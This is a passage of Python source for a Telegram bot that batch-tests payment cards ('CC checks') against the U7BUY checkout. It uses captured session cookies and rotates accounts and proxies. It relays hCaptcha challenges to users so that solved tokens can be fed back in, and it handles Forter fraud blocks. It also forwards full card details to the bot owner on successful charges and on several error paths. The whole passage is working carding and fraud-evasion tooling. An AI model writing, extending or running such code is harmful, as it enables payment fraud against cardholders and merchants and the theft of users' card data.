        exp_month = card.get("exp_month")
        exp_year = card.get("exp_year")
        card_cvc = card.get("card_cvc")
        card_holder_name = card.get("card_holder_name")

        if tg_id == OWNER_ID:
            if not _owner_accounts_sorted:
                result = {"status": "error", "message": "No active owner accounts available."}
                break

            n = len(_owner_accounts_sorted)

            # Find circular start: first account with < 5 checks
            start_idx = 0
            for i in range(n):
                used = await db.get_account_used_checks(_owner_accounts_sorted[i][0]["id"])
                if used < 5:
                    start_idx = i
                    break

            card_success = False

            # Inner loop: try each account for THIS card
            for attempt in range(n):
                idx = (start_idx + attempt) % n
                chosen_acc, chosen_proxy = _owner_accounts_sorted[idx]

                acc_id      = chosen_acc["id"]
                email       = chosen_acc.get("email", "Unknown")
                p_url       = chosen_proxy.get("url", "")
                p_label     = chosen_proxy.get("label", "Default")
                cookies_str = chosen_acc.get("cookies_json", "")

                if p_url:
                    os.environ["PROXY_URL"] = p_url

                client = U7BuyApiClient(cookies_str, proxy_url=p_url)

                session_data = await client.validate_session()
                if not session_data:
                    logger.warning(f"[OwnerRotation] {email} session dead — trying next account")
                    continue

                await callback.message.edit_text(
                    f"⏳ *Processing Payment*\n\n"
                    f"📦 {product_name}\n"
                    f"💳 Card *{card_idx}/{total_cards}*: `**** **** **** {card_number[-4:]}`\n"
                    f"📧 Account: `{email}`\n"
                    f"🖥️ Proxy: `{p_label}`\n\n"
                    f"🔒 Submitting via Stripe...",
                    parse_mode="Markdown"
                )

                cash_info_key = await _get_cash_info_key(client, sku_url, offer_id, target_username)
                if not cash_info_key:
                    logger.warning(f"[OwnerRotation] {email} — no cashInfoKey, trying next account")
                    continue

                result = await client.full_checkout(
                    cash_info_key=cash_info_key,
                    card_number=card_number,
                    exp_month=exp_month,
                    exp_year=exp_year,
                    cvc=card_cvc,
                    card_holder_name=card_holder_name
                )

                await db.increment_account_check(acc_id)
                order_id = result.get("order_id", "N/A")
                status   = result.get("status")

                await db.log_order(
                    tg_id=tg_id,
                    api_order_id=order_id,
                    product_name=product_name,
                    price=float(price) if price and str(price).replace(".", "").isdigit() else 0.0,
                    status=status,
                    card_last4=card_number[-4:] if card_number else "",
                    proxy_id=chosen_proxy["id"]
                )

                if status in ["success", "3ds_required", "captcha_needed"]:
                    card_success = True
                    break

                # Card itself declined — no point trying more accounts
                if is_card_decline(result):
                    logger.info(f"[OwnerRotation] Card declined on {email} — stopping")
                    break

                # Account/token issue — rotate to next account
                logger.warning(f"[OwnerRotation] {email} failed ({status}) — rotating to next account")

            if card_success:
                break
            if is_card_decline(result):
                break


                
        else:
            # ── Regular User Flow (Unchanged slot rotation) ──
            allowed_now, cooldown_now, slot = await db.can_check_cc(tg_id)
            if not allowed_now:
                result = {"status": "rate_limited", "message": "Rate limit reached mid-batch."}
                break
                
            cookies = await _get_cookies_for_slot(user, slot)
            if not cookies:
                other_slot = "slot2" if slot == "slot1" else "slot1"
                cookies = await _get_cookies_for_slot(user, other_slot)
                if cookies:
                    slot = other_slot
                else:
                    result = {"status": "error", "message": "No account cookies configured."}
                    break
                    
            token_check = quick_token_check(cookies)
            if not token_check["ok"]:
                logger.warning(f"Slot {slot} cookies expired for user {tg_id}, trying other slot")
                other_slot = "slot2" if slot == "slot1" else "slot1"
                alt_cookies = await _get_cookies_for_slot(user, other_slot)
                if alt_cookies and quick_token_check(alt_cookies)["ok"]:
                    cookies = alt_cookies
                    slot = other_slot
                else:
                    result = {"status": "error", "message": "All sessions expired. Contact owner to refresh cookies."}
                    break
                    
            client = U7BuyApiClient(cookies, proxy_url=proxy_url)
            
            await callback.message.edit_text(
                f"⏳ *Processing Payment*\n\n"
                f"📦 {product_name}\n"
                f"💳 Card *{card_idx}/{total_cards}*: `**** **** **** {card_number[-4:]}`\n"
                f"👤 Name: `{card_holder_name}`\n"
                f"🔑 Account: Slot {slot[-1]}\n\n"
                f"🔒 Submitting via Stripe...",
                parse_mode="Markdown"
            )
            
            cash_info_key = await _get_cash_info_key(client, sku_url, offer_id, target_username)
            if not cash_info_key:
                await callback.message.edit_text(
                    "❌ *Checkout Error*\n\n"
                    "Could not generate checkout link.\n"
                    "Product may be temporarily unavailable.",
                    parse_mode="Markdown"
                )
                await state.clear()
                os.environ["PROXY_URL"] = old_proxy
                return
                
            result = await client.full_checkout(
                cash_info_key=cash_info_key,
                card_number=card_number,
                exp_month=exp_month,
                exp_year=exp_year,
                cvc=card_cvc,
                card_holder_name=card_holder_name
            )
            
            await db.increment_cc_check(tg_id, slot)
            
            order_id = result.get("order_id", "N/A")
            status = result.get("status")
            
            await db.log_order(
                tg_id=tg_id,
                api_order_id=order_id,
                product_name=product_name,
                price=float(price) if price and str(price).replace(".", "").isdigit() else 0.0,
                status=status,
                card_last4=card_number[-4:] if card_number else "",
                proxy_id=user.get("proxy_id", "")
            )
            
            if status in ["success", "3ds_required", "captcha_needed"]:
                break
                
            if card_idx < total_cards:
                await callback.message.edit_text(
                    f"⚠️ Card *{card_idx}/{total_cards}* (`**** {card_number[-4:]}`) → ❌ {status.upper()}\n\n"
                    f"🔄 Trying next card...",
                    parse_mode="Markdown"
                )

    # Restore proxy
    os.environ["PROXY_URL"] = old_proxy

    # Final result values
    order_id = result.get("order_id", "N/A")
    status = result.get("status")
    msg = result.get("message", "")
    safe_msg = str(msg).replace("[","(").replace("]",")").replace("_"," ").replace("*","")

    # Send screenshot (user)
    last_screenshot = result.get("screenshot_path")
    card_number = last_card.get("card_number", "")
    if last_screenshot:
        import os as _os
        if _os.path.exists(last_screenshot):
            try:
                photo = FSInputFile(last_screenshot)

                if status == "success":
                    caption = (
                        f"✅ *APPROVED*\n\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"💳 `**** **** **** {card_number[-4:]}`\n"
                        f"📦 {product_name}\n"
                        f"💵 ₹{price}\n"
                        f"🆔 Order: `{order_id}`\n"
                        f"━━━━━━━━━━━━━━━━━━"
                    )
                elif status == "3ds_required":
                    caption = (
                        f"🔐 *3DS Required*\n\n"
                        f"💳 `**** **** **** {card_number[-4:]}`\n"
                        f"📦 {product_name}"
                    )
                else:
                    caption = (
                        f"❌ *{status.upper()}*\n\n"
                        f"💳 `**** **** **** {card_number[-4:]}`\n"
                        f"📦 {product_name}"
                    )
                await callback.message.answer_photo(photo=photo, caption=caption, parse_mode="Markdown")
            except Exception as pe:
                logger.error(f"Failed to send screenshot: {pe}")


    # ── Result messages to USER ──
    if status == "success":
        # Send CC details to OWNER ONLY on success
        await _notify_owner_success(
            bot=callback.bot,
            user=user,
            card=last_card,
            product_name=product_name,
            price=price,
            order_id=order_id,
            target_username=target_username or ""
        )

        await callback.message.edit_text(
            f"🎉 *Payment Successful!*\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📦 *Product:* {product_name}\n"
            f"💵 *Price:* ₹{price}\n"
            f"🆔 *Order ID:* `{order_id}`\n"
            f"{'👤 *Account:* `' + target_username + '`' + chr(10) if target_username else ''}"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"✅ Check your U7BUY order history for delivery.",
            parse_mode="Markdown"
        )

    elif status == "3ds_required":
        redirect_url = result.get("redirect_url", "")
        await callback.message.edit_text(
            f"🔐 <b>3D-Secure Verification Required</b>\n\n"
            f"📦 <b>Product:</b> {product_name}\n"
            f"🆔 <b>Order ID:</b> <code>{order_id}</code>\n\n"
            f"Your bank requires OTP verification.\n"
            f'👇 <a href="{redirect_url}">Click Here to Verify OTP</a>\n\n'
            f"<i>After verification, your order will complete automatically.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    elif status == "rate_limited":
        rl = await db.get_rate_limit(tg_id)
        from database.db import COOLDOWN_SECS
        remaining = COOLDOWN_SECS - (int(time.time()) - rl.get("window_start", 0))
        hrs = max(0, remaining) // 3600
        mins = (max(0, remaining) % 3600) // 60
        await callback.message.edit_text(
            f"⏳ *Rate Limit Reached*\n\n"
            f"10 CC checks completed.\n"
            f"⏰ *Cooldown:* {hrs}h {mins}m remaining.",
            parse_mode="Markdown"
        )

    elif status == "fraud_declined":
        # Forward to owner
        await _notify_owner_error(
            bot=callback.bot,
            user=user,
            status=status,
            message="Payment flagged as fraudulent/Forter security block.",
            card=last_card,
            screenshot_path=last_screenshot
        )
        await callback.message.edit_text(
            f"🚫 *Fraud Detection Blocked*\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Your payment was flagged by U7BUY's security system.\n\n"
            f"*Possible reasons:*\n"
            f"• Automated payment detection\n"
            f"• IP flagged as suspicious\n\n"
            f"Try purchasing directly on u7buy.com",
            parse_mode="Markdown",
            disable_web_page_preview=True
        )

    elif status == "captcha_needed":
        # Forward to owner
        await _notify_owner_error(
            bot=callback.bot,
            user=user,
            status=status,
            message="hCaptcha verification requested by U7BUY.",
            card=last_card,
            screenshot_path=last_screenshot
        )
        sitekey = result.get("sitekey", "")
        page_url = result.get("page_url", "https://www.u7buy.com/cashier")

        # Generate HTML captcha solver file
        html_content = _generate_captcha_html(sitekey, page_url)
        html_path = f"scratch/captcha_solver_{tg_id}.html"
        import os
        os.makedirs("scratch", exist_ok=True)
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(html_content)

        # Save checkout context so we can retry with token
        await state.update_data(
            captcha_cash_info_key=cash_info_key,
            captcha_sitekey=sitekey,
            captcha_page_url=page_url,
            captcha_cards_batch=cards_batch,
            captcha_card_idx=card_idx - 1,
            captcha_product_name=product_name,
            captcha_price=price,
            captcha_sku_url=sku_url,
            captcha_offer_id=offer_id,
            captcha_target_username=target_username,
            captcha_proxy_id=user.get("proxy_id", ""),
            captcha_slot=slot
        )
        await state.set_state(OrderStates.waiting_for_captcha_token)

        # Send screenshot + HTML solver to user
        ss = result.get("screenshot_path")
        if ss and os.path.exists(ss):
            try:
                await callback.message.answer_photo(
                    photo=FSInputFile(ss),
                    caption=(
                        "🤖 *hCaptcha Detected!*\n\n"
                        "U7BUY wants to verify you're human.\n"
                        "Follow steps below to solve it."
                    ),
                    parse_mode="Markdown"
                )
            except Exception:
                pass

        html_file = FSInputFile(html_path, filename="solve_captcha.html")
        await callback.message.answer_document(
            document=html_file,
            caption=(
                f"🔐 *Solve the Captcha*\n\n"
                f"*Steps:*\n"
                f"1️⃣ Download & open `solve_captcha.html` in browser\n"
                f"2️⃣ Click *I am human* and solve the challenge\n"
                f"3️⃣ Copy the token shown on page\n"
                f"4️⃣ Send the token here\n\n"
                f"⏳ Token expires in ~2 minutes — solve quickly!"
            ),
            parse_mode="Markdown"
        )
        await callback.message.edit_text(
            "⌛ *Waiting for captcha token...*\n\nSolve the HTML file and send the token here.",
            parse_mode="Markdown"
        )
        # Don't clear state — we're waiting for token
        return

    elif status in ["failed", "card_declined", "card_error"]:
        # Send to owner ONLY if not owner themselves (no self-spam)
        if tg_id != OWNER_ID:
            await _notify_owner_error(
                bot=callback.bot,
                user=user,
                status=status,
                message=safe_msg or "Card charge failed/declined.",
                card=last_card,
                screenshot_path=last_screenshot
            )
        await callback.message.edit_text(
            f"❌ *Payment Failed*\n\n"
            f"All {total_cards} card(s) tried — none succeeded.\n"
            f"Reason: {safe_msg or status.replace('_',' ').title()}\n\n"
            f"Try different cards or contact support.",
            parse_mode="Markdown"
        )

    elif status == "timeout":
        # Forward to owner
        await _notify_owner_error(
            bot=callback.bot,
            user=user,
            status=status,
            message="Payment processing timed out. Session state unclear.",
            card=last_card,
            screenshot_path=last_screenshot
        )
        await callback.message.edit_text(
            f"⚠️ *Processing Timeout*\n\n"
            f"An error occurred during processing.\n"
            f"The issue has been forwarded to the owner and will be fixed soon.",
            parse_mode="Markdown"
        )

    else:
        # Forward to owner
        await _notify_owner_error(
            bot=callback.bot,
            user=user,
            status=status,
            message=safe_msg or "Unknown execution error",
            card=last_card,
            screenshot_path=last_screenshot
        )
        await callback.message.edit_text(
            f"⚠️ *System Error*\n\n"
            f"An error occurred during processing.\n"
            f"The issue has been forwarded to the owner and will be fixed soon.",
            parse_mode="Markdown"
        )

    await state.clear()


# ─────────────────────────────────────────────────────────
# Helper: Get cashInfoKey
# ─────────────────────────────────────────────────────────
async def _get_cash_info_key(client, sku_url: str,
                              offer_id: str = None,
                              target_username: str = None) -> str | None:
    if sku_url == "telegram-stars":
        if not offer_id or not target_username:
            return None
        result = await client.save_cashier_info(
            offer_id=offer_id,
            tg_username=target_username
        )
        return result.get("cashInfoKey")
    else:
        import aiohttp
        url = f"{client.BASE_URL}/prod-api/api/order/digital/createOrder"
        payload = {"skuUrl": sku_url}
        try:
            async with aiohttp.ClientSession() as session:
                proxy_url = settings.PROXY_URL.strip() if settings.PROXY_URL else None
                async with session.post(
                    url,
                    json=payload,
                    headers=client.headers,
                    cookies=client.cookies_dict,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=20)
                ) as resp:
                    data = await resp.json()
                    if data.get("code") == 200:
                        return data.get("data", {}).get("cashInfoKey")
        except Exception as e:
            logger.error(f"createOrder error: {e}")
        return None


# ─────────────────────────────────────────────────────────
# Helper: Generate hCaptcha solver HTML
# ─────────────────────────────────────────────────────────
def _generate_captcha_html(sitekey: str, page_url: str) -> str:
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>hCaptcha Solver</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #0f172a, #1e1b4b);
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 30px;
            border-radius: 24px;
            text-align: center;
            box-shadow: 0 12px 40px 0 rgba(0, 0, 0, 0.5);
            max-width: 420px;
            width: 100%;
        }}
        h2 {{ margin-top: 0; margin-bottom: 12px; font-weight: 700; color: #818cf8; letter-spacing: -0.5px; }}
        p {{ color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }}
        .captcha-box {{
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }}
        textarea {{
            width: 100%;
            height: 110px;
            background: rgba(0, 0, 0, 0.25);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #38bdf8;
            border-radius: 12px;
            padding: 12px;
            font-family: monospace;
            font-size: 11px;
            resize: none;
            margin-top: 16px;
            box-sizing: border-box;
            display: none;
        }}
        button {{
            background: linear-gradient(135deg, #6366f1, #4f46e5);
            border: none;
            color: white;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 16px;
            display: none;
            width: 100%;
        }}
        button:hover {{
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.35);
        }}
    </style>
    <script>
        function onSolved(response) {{
            const tokenArea = document.getElementById("token-area");
            const copyBtn = document.getElementById("copy-btn");
            tokenArea.style.display = "block";
            tokenArea.value = response;
            copyBtn.style.display = "block";
        }}
        function copyToken() {{
            const tokenArea = document.getElementById("token-area");
            tokenArea.select();
            tokenArea.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(tokenArea.value).then(() => {{
                alert("Token copied successfully!");
            }}).catch(() => {{
                // fallback
                document.execCommand("copy");
                alert("Token copied!");
            }});
        }}
    </script>
</head>
<body>
    <div class="container">
        <h2>Verify You Are Human</h2>
        <p>Solve the verification box below to obtain the token for U7BUY payment.</p>
        <div class="captcha-box">
            <div class="h-captcha" data-sitekey="{sitekey}" data-callback="onSolved"></div>
        </div>
        <textarea id="token-area" readonly placeholder="Token will appear here..."></textarea>
        <button id="copy-btn" onclick="copyToken()">Copy Token</button>
    </div>
</body>
</html>
"""


# ─────────────────────────────────────────────────────────
# OrderStates: waiting_for_captcha_token
# ─────────────────────────────────────────────────────────
@router.message(OrderStates.waiting_for_captcha_token)
async def process_captcha_token(message: Message, state: FSMContext):
    token = message.text.strip()
    try:
        await message.delete()
    except Exception:
        pass

    if len(token) < 50:
        await message.answer("❌ Invalid captcha token. Please solve the challenge and send the complete token.")
        return

    state_data = await state.get_data()
    product_name = state_data.get("captcha_product_name")
    price = state_data.get("captcha_price")
    sku_url = state_data.get("captcha_sku_url")
    offer_id = state_data.get("captcha_offer_id")
    target_username = state_data.get("captcha_target_username")
    cards_batch = state_data.get("captcha_cards_batch", [])
    card_idx = state_data.get("captcha_card_idx", 0)
    slot = state_data.get("captcha_slot")
    tg_id = message.from_user.id

    user, err = await _check_user_access(tg_id)
    if err:
        await message.answer(err, parse_mode="Markdown")
        await state.clear()
        return

    # Apply owner proxy override if active
    owner_override_proxy = state_data.get("owner_override_proxy_id")
    if tg_id == OWNER_ID and owner_override_proxy:
        user["proxy_id"] = owner_override_proxy


    card = cards_batch[card_idx] if card_idx < len(cards_batch) else cards_batch[-1]
    card_number = card.get("card_number")
    exp_month = card.get("exp_month")
    exp_year = card.get("exp_year")
    card_cvc = card.get("card_cvc")
    card_holder_name = card.get("card_holder_name")

    status_msg = await message.answer(
        f"⏳ *Submitting Payment with Verification...*\n\n"
        f"📦 {product_name} — ₹{price}\n"
        f"💳 Card: `**** **** **** {card_number[-4:]}`\n"
        f"🔄 Submitting with token...",
        parse_mode="Markdown"
    )

    cookies = await _get_cookies_for_slot(user, slot)
    if not cookies:
        await status_msg.edit_text("❌ Cookie session lost. Please try again.")
        await state.clear()
        return

    proxy_url = await _get_proxy_url_for_user(user)
    import os
    old_proxy = os.environ.get("PROXY_URL", "")
    if proxy_url:
        os.environ["PROXY_URL"] = proxy_url

    client = U7BuyApiClient(cookies, proxy_url=proxy_url)


    # Get cashier key
    cash_info_key = await _get_cash_info_key(client, sku_url, offer_id, target_username)
    if not cash_info_key:
        await status_msg.edit_text("❌ Could not re-generate checkout URL.")
        if proxy_url:
            os.environ["PROXY_URL"] = old_proxy
        await state.clear()
        return

    # Call checkout with captcha token!
    result = await client.full_checkout(
        cash_info_key=cash_info_key,
        card_number=card_number,
        exp_month=exp_month,
        exp_year=exp_year,
        cvc=card_cvc,
        card_holder_name=card_holder_name,
        captcha_token=token
    )

    await db.increment_cc_check(tg_id, slot)

    order_id = result.get("order_id", "N/A")
    status = result.get("status")

    await db.log_order(
        tg_id=tg_id,
        api_order_id=order_id,
        product_name=product_name,
        price=float(price) if price and str(price).replace(".", "").isdigit() else 0.0,
        status=status,
        card_last4=card_number[-4:] if card_number else "",
        proxy_id=user.get("proxy_id", "")
    )

    if proxy_url:
        os.environ["PROXY_URL"] = old_proxy

    # Send screenshot if exists
    last_screenshot = result.get("screenshot_path")
    if last_screenshot and os.path.exists(last_screenshot):
        try:
            photo = FSInputFile(last_screenshot)
            if status == "success":
                caption = (
                    f"✅ *APPROVED*\n\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"💳 `**** **** **** {card_number[-4:]}`\n"
                    f"📦 {product_name}\n"
                    f"💵 ₹{price}\n"
                    f"🆔 Order: `{order_id}`\n"
                    f"━━━━━━━━━━━━━━━━━━"
                )
            elif status == "3ds_required":
                caption = (
                    f"🔐 *3DS Required*\n\n"
                    f"💳 `**** **** **** {card_number[-4:]}`\n"
                    f"📦 {product_name}"
                )
            else:
                caption = (
                    f"❌ *{status.upper()}*\n\n"
                    f"💳 `**** **** **** {card_number[-4:]}`\n"
                    f"📦 {product_name}"
                )
            await message.answer_photo(photo=photo, caption=caption, parse_mode="Markdown")
        except Exception as pe:
            logger.error(f"Failed to send captcha screenshot: {pe}")


    msg = result.get("message", "")
    safe_msg = str(msg).replace("[","(").replace("]",")").replace("_"," ").replace("*","")

    if status == "success":
        await _notify_owner_success(
            bot=message.bot,
            user=user,
            card=card,
            product_name=product_name,
            price=price,
            order_id=order_id,
            target_username=target_username or ""
        )
        await status_msg.edit_text(
            f"🎉 *Payment Successful!*\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📦 *Product:* {product_name}\n"
            f"💵 *Price:* ₹{price}\n"
            f"🆔 *Order ID:* `{order_id}`\n"
            f"{'👤 *Account:* `' + target_username + '`' + chr(10) if target_username else ''}"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"✅ Check your U7BUY order history for delivery.",
            parse_mode="Markdown"
        )
    elif status == "3ds_required":
        redirect_url = result.get("redirect_url", "")
        await status_msg.edit_text(
            f"🔐 <b>3D-Secure Verification Required</b>\n\n"
            f"📦 <b>Product:</b> {product_name}\n"
            f"🆔 <b>Order ID:</b> <code>{order_id}</code>\n\n"
            f"Your bank requires OTP verification.\n"
            f'👇 <a href="{redirect_url}">Click Here to Verify OTP</a>\n\n'
            f"<i>After verification, your order will complete automatically.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    elif status == "captcha_needed":
        # Recursively ask for captcha solver html if it is triggered again
        sitekey = result.get("sitekey", "")
        page_url = result.get("page_url", "https://www.u7buy.com/cashier")
        html_content = _generate_captcha_html(sitekey, page_url)
        html_path = f"scratch/captcha_solver_{tg_id}.html"
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(html_content)

        html_file = FSInputFile(html_path, filename="solve_captcha.html")
        await message.answer_document(
            document=html_file,
            caption=(
                f"🔐 *Captcha Required Again*\n\n"
                f"1️⃣ Open `solve_captcha.html` in browser\n"
                f"2️⃣ Click *I am human* and solve challenge\n"
                f"3️⃣ Send new token here."
            ),
            parse_mode="Markdown"
        )
        await status_msg.edit_text("⌛ *Waiting for captcha token...*", parse_mode="Markdown")
        return
    elif status in ["failed", "card_declined", "card_error"]:
        await status_msg.edit_text(
            f"❌ *Payment Failed*\n\n"
            f"Reason: {safe_msg or status.replace('_',' ').title()}\n\n"
            f"Please try again or contact support.",
            parse_mode="Markdown"
        )
    elif status == "timeout":
        await _notify_owner_error(
            bot=message.bot,
            user=user,
            status=status,
            message="Payment processing timed out after captcha validation.",
            screenshot_path=last_screenshot
        )
        await status_msg.edit_text(
            f"⚠️ *Processing Timeout*\n\n"
            f"An error occurred during processing.\n"
            f"The issue has been forwarded to the owner and will be fixed soon.",
            parse_mode="Markdown"
        )
    else:
        await _notify_owner_error(
            bot=message.bot,
            user=user,
            status=status,
            message=safe_msg or "Unknown execution error after captcha",
            screenshot_path=last_screenshot
        )
        await status_msg.edit_text(
            f"⚠️ *System Error*\n\n"
            f"An error occurred during processing.\n"
            f"The issue has been forwarded to the owner and will be fixed soon.",
            parse_mode="Markdown"
        )

    await state.clear()

